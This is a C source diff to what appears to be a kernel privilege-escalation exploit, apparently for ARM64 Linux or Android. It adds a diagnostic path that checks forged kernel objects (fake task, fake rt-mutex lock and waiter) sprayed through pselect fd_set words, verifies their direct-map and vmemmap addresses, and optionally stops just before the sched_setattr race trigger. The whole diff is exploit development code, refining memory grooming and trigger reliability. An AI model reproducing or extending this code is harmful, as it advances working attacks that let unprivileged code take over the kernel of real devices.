@@ -21,6 +21,16 @@
 #if SLIDE_PSELECT_RESULT_ROUTE && SLIDE_PSELECT_WORD_SHIFT != 1
 #error "SLIDE_PSELECT_RESULT_ROUTE requires word shift 1"
 #endif
+#if defined(APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC) && \
+    APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC && \
+    (!defined(APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED) || \
+     !APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED)
+#error "pretrigger geometry diagnostic requires stop before sched_setattr"
+#endif
+#if defined(APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED) && \
+    APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED && !SLIDE_PSELECT_RESULT_ROUTE
+#error "stop-before-sched diagnostic requires the pselect result route"
+#endif
 #define SLIDE_WAIT_NSEC 50000000L
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
@@ -320,6 +330,59 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   }
 }
 
+#if defined(APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC) && \
+    APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC
+static int slide_direct_range_ok(uintptr_t address, size_t size) {
+  return address >= DIRECT_MAP_BASE && address < DIRECT_MAP_END &&
+         size <= DIRECT_MAP_END - address;
+}
+
+static int slide_log_pretrigger_geometry(size_t slot) {
+  fd_set in;
+  fd_set out;
+  fd_set ex;
+  prepare_slide_pselect_fdsets(&in, &out, &ex);
+  int words_per_set = slide_pselect_words_per_set();
+  const uint64_t expected[] = {
+    slide_oracle_parent, 0, slide_oracle_target,
+    slide_oracle_parent, 0, slide_oracle_target,
+    fake_task, fake_lock, SLIDE_FAKE_WAITER_PRIO, 0,
+  };
+  int words_ok = 1;
+  for (size_t index = 0; index < sizeof(expected) / sizeof(expected[0]);
+       index++) {
+    int global_word = slide_pselect_global_word((int)index);
+    uint64_t actual = slide_pselect_get_global_word(
+        &in, &out, &ex, words_per_set, global_word);
+    int match = actual == expected[index];
+    words_ok &= match;
+    pr_info("p0 pretrigger waiter word=%zu global=%d actual=%016llx "
+            "expected=%016llx match=%d\n",
+            index, global_word, (unsigned long long)actual,
+            (unsigned long long)expected[index], match);
+  }
+
+  int page_ok = slide_direct_range_ok(page_base, ORDER3_SIZE);
+  int task_ok = slide_direct_range_ok(
+      fake_task, FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t));
+  int lock_ok = slide_direct_range_ok(
+      fake_lock, (fake_w0 - fake_lock) + FAKE_WAITER_LAYOUT_SIZE);
+  int parent_ok = slide_oracle_parent >= VMEMMAP_START &&
+                  slide_oracle_parent < VMEMMAP_END;
+  int target_ok = slide_direct_range_ok(
+      slide_oracle_target, sizeof(uint64_t));
+  pr_info("p0 pretrigger geometry slot=%zu page=%016zx task=%016zx "
+          "pi_lock=%016zx lock=%016zx waiter=%016zx parent=%016zx "
+          "target=%016zx\n",
+          slot, page_base, fake_task, fake_task + FAKE_TASK_PI_LOCK_OFF,
+          fake_lock, fake_w0, slide_oracle_parent, slide_oracle_target);
+  pr_info("p0 pretrigger range page=%d task=%d lock_waiter=%d parent=%d "
+          "target=%d words=%d\n",
+          page_ok, task_ok, lock_ok, parent_ok, target_ok, words_ok);
+  return page_ok && task_ok && lock_ok && parent_ok && target_ok && words_ok;
+}
+#endif
+
 void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
   for (int fd = 0; fd < slide_pselect_nfds; fd++) {
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
@@ -587,7 +650,10 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
   atomic_store(&slide_consumer_ready, 1);
+#if !defined(APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED) || \
+    !APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED
   int *errno_ptr = &errno;
+#endif
 
   int seen = 0;
   for (;;) {
@@ -685,6 +751,14 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int tid = atomic_load(&slide_waiter_tid);
 #endif
 
+#if defined(APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED) && \
+    APP_SLIDE_DIAGNOSTIC_STOP_BEFORE_SCHED
+    pr_warning("p0 pretrigger diagnostic stop tid=%d seq=%d; "
+               "result fdsets matched, sched_setattr not entered\n",
+               tid, seq);
+    atomic_store(&slide_consume_stop, 1);
+    return NULL;
+#else
     int calls = atomic_load(&slide_consume_calls);
     int entered = atomic_load(&slide_consume_enter_sched) + 1;
     atomic_store(&slide_consume_enter_sched, entered);
@@ -710,6 +784,7 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       __asm__ volatile("yield" ::: "memory");
     }
     return NULL;
+#endif
   }
 }
 
@@ -981,6 +1056,14 @@ static int slide_trigger_physical_slot(size_t slot) {
   if (!select_slide_payload_index(slot)) {
     return 0;
   }
+
+#if defined(APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC) && \
+    APP_SLIDE_PRETRIGGER_GEOMETRY_DIAGNOSTIC
+  if (!slide_log_pretrigger_geometry(slot)) {
+    pr_error("p0 pretrigger geometry rejected slot=%zu\n", slot);
+    return 0;
+  }
+#endif
 
   int base_delay = (int)slide_enter_delay_usec();
 #if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
